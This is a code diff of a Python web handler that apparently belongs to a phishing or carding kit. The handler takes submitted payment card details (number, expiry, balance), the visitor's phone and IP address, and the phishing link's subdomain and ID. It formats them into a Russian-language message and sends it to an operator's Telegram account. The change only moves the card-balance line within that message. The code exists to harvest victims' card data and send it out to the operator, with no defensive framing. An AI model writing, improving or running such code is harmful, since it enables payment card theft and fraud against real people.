@@ -176,6 +176,9 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         f"🔗 <b>Ссылка:</b> {payload.subdomain}/{payload.link_id}",
         f"🌐 <b>IP посетителя:</b> <code>{ip}</code>",
         "",
+        "💰 <b>Баланс карты:</b> "
+        f"<code>{payload.balance_amount} {payload.balance_currency or ''}</code>",
+        "",
         "💳 <b>Карта:</b>",
         f"  Номер: <code>{payload.card_number or '—'}</code>",
         f"  Срок: <code>{payload.card_exp or '—'}</code>",
@@ -193,9 +196,6 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
             dial=payload.phone_dial or "",
             phone=payload.phone or "—",
         ),
-        "",
-        "💰 <b>Баланс карты:</b> "
-        f"<code>{payload.balance_amount} {payload.balance_currency or ''}</code>",
     ]
 
     await _send_telegram("\n".join(lines), owner_tg_id)
